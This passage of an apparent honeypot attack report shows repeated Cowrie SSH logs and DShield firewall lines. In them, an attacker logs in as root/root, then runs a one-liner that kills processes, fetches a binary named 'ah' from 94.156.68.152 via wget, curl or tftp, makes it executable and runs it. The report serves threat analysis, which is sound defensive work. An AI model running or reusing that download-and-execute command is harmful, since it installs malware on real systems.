-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}

```

</details>

---


## DShield Logs
Total DShield logs: `20`

#### The `5` sessions in this attack were logged as connection in the following DShield firewall logs:
Here is a sample of the log lines:

```log
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
